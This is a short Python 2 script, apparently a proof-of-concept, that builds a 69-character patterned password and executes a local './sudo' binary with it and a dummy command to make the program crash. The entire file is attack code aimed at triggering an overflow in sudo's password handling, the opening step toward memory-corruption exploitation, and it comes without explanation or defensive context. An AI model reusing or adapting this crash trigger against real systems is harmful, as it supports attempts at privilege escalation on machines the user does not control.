import os, sys


PATH_TO_SUDO = './sudo'


def crash_sudo():
	Crash_Password = ""
	My_dict = {0:'a', 1:'b', 2:'c', 3:'d', 4:'e', 5:'f', 6:'g'}
	for i in xrange(69):
		Crash_Password += My_dict.get(int(i/10))
	os.execl(PATH_TO_SUDO, __file__, Crash_Password, "Make_You_Happy_Command")

def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    crash_sudo()


if __name__ == '__main__':
    main(sys.argv)
